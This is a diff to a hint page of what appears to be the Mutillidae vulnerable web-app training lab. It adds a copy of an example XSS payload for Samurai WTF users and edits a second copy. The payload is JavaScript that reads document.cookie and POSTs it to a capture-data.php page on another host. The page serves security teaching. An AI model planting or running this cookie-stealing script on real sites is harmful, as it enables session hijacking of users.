@@ -105,7 +105,46 @@
 			Try Tamper Data to get control of all the HTTP headers in the request. 
 			You can start by changing the user-agent to see your input displayed here.
 			<br/><br/>
-			<span class="report-header">Example</span>
+			<span class="report-header">Example (For Samurai WTF)</span>
+			<br/><br/>
+			<textarea cols="80" rows="20">
+			&lt;script&gt;
+				var lXMLHTTP;
+				try{ 
+					var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
+					var lHost = &quot;mutillidae&quot;;
+					var lProtocol = &quot;http&quot;;
+					var lFilePath = &quot;/capture-data.php&quot;;
+					var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
+					var lMethod = &quot;POST&quot;;
+			
+					try {
+						lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); 
+					}catch (e) { 
+						try { 
+							lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); 
+						}catch (e) { 
+							try { 
+								lXMLHTTP = new XMLHttpRequest(); 
+							}catch (e) { 
+								alert(e.message);/*For testing only*/
+							} 
+						} 
+					}/*end try*/
+			
+					lXMLHTTP.onreadystatechange = function(){};
+					lXMLHTTP.open(lMethod, lAction, true);
+					lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost); 
+					lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);			
+					lXMLHTTP.send(lData);
+			
+				}catch(e){
+					alert(e.message);/*For testing only*/
+				} 
+			&lt;/script&gt;
+			</textarea>
+			<br/><br/>
+			<span class="report-header">Example (For non-Samurai WTF users)</span>
 			<br/><br/>
 			<textarea cols="80" rows="20">
 			&lt;script&gt;
@@ -127,18 +166,19 @@
 							try { 
 								lXMLHTTP = new XMLHttpRequest(); 
 							}catch (e) { 
-								//alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
+								alert(e.message);/*For testing only*/
 							} 
 						} 
-					}//end try
+					}/*end try*/
 			
-					lXMLHTTP.onreadystatechange = function(){} 
+					lXMLHTTP.onreadystatechange = function(){};
 					lXMLHTTP.open(lMethod, lAction, true);
 					lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost); 
 					lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);			
 					lXMLHTTP.send(lData);
 			
-				}catch(e){ 
+				}catch(e){
+					alert(e.message);/*For testing only*/
 				} 
 			&lt;/script&gt;
 			</textarea>
